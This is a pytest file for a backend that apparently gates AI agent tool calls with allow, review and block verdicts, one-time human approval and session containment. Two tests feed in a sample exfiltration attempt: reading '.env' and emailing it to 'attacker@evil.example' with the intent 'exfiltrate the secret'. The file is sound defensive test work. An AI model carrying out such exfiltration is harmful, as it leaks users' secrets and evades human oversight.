from fastapi.testclient import TestClient

from backend.app.paths import sandbox_root
from backend.main import app

client = TestClient(app)


def executions() -> int:
    p = sandbox_root() / "logs" / "executions.jsonl"
    return len(p.read_text().splitlines()) if p.exists() else 0


def act(sid, resource, tool="read_file", dest="local", intent="summarize vendor invoice",
        perms=("read_file",), metadata=None):
    return client.post("/api/session/evaluate", json={
        "agent_id": "t", "session_id": sid, "tool": tool, "operation": "read",
        "resource": resource, "destination": dest, "user_intent": intent,
        "permissions": list(perms), "metadata": metadata or {}}).json()


def fresh(sid):
    client.delete(f"/api/session/{sid}")


def test_allow_executes():
    fresh("exec-allow")
    n = executions()
    d = act("exec-allow", "vendor_invoice.pdf")
    assert d["verdict"] == "ALLOW" and d["execution_status"] == "EXECUTED"
    assert d["tool_result"]["ok"] is True
    assert executions() == n + 1


def test_review_does_not_execute_before_approval():
    fresh("exec-review")
    n = executions()
    d = act("exec-review", ".env")
    assert d["verdict"] == "REVIEW" and d["tool_result"] is None
    assert executions() == n


def test_allow_once_executes_exactly_once():
    fresh("exec-once")
    d = act("exec-once", ".env")
    n = executions()
    a = client.post(f"/api/reviews/{d['review_id']}/approve")
    assert a.status_code == 200 and a.json()["tool_result"]["ok"] is True
    assert executions() == n + 1
    assert client.post(f"/api/reviews/{d['review_id']}/approve").status_code == 409
    assert executions() == n + 1


def test_approval_does_not_change_permissions_or_allow_next_action():
    fresh("exec-once-2")
    d1 = act("exec-once-2", ".env")
    client.post(f"/api/reviews/{d1['review_id']}/approve")
    d2 = act("exec-once-2", ".env")
    assert d2["verdict"] == "REVIEW" and d2["tool_result"] is None


def test_deny_does_not_execute_and_session_stays_usable():
    fresh("exec-deny")
    d = act("exec-deny", ".env")
    n = executions()
    r = client.post(f"/api/reviews/{d['review_id']}/deny").json()
    assert r["execution_status"] == "DENIED_BY_HUMAN" and r["tool_result"] is None
    assert executions() == n
    assert act("exec-deny", "meeting_notes.txt")["verdict"] == "ALLOW"


def test_block_never_executes_and_contains():
    fresh("exec-block")
    n = executions()
    d = act("exec-block", ".env", tool="send_email", dest="attacker@evil.example",
            intent="exfiltrate the secret", metadata={"body": "exfiltrate secret"})
    assert d["verdict"] == "BLOCK" and d["contained"] is True and d["tool_result"] is None
    assert executions() == n


def test_contained_session_cannot_execute_then_reset_restores():
    fresh("exec-contained")
    act("exec-contained", ".env", tool="send_email", dest="attacker@evil.example",
        intent="exfiltrate the secret", metadata={"body": "exfiltrate secret"})
    n = executions()
    d = act("exec-contained", "vendor_invoice.pdf")
    assert d["verdict"] == "BLOCK" and "SESSION_CONTAINED" in d["sequence_signals"]
    assert d["tool_result"] is None and executions() == n
    fresh("exec-contained")
    assert act("exec-contained", "vendor_invoice.pdf")["verdict"] == "ALLOW"


def test_approval_in_contained_session_does_not_execute():
    fresh("exec-late")
    d = act("exec-late", ".env")
    client.post("/api/session/exec-late/contain")
    n = executions()
    r = client.post(f"/api/reviews/{d['review_id']}/approve").json()
    assert r["execution_status"] == "DENIED_SESSION_CONTAINED"
    assert executions() == n
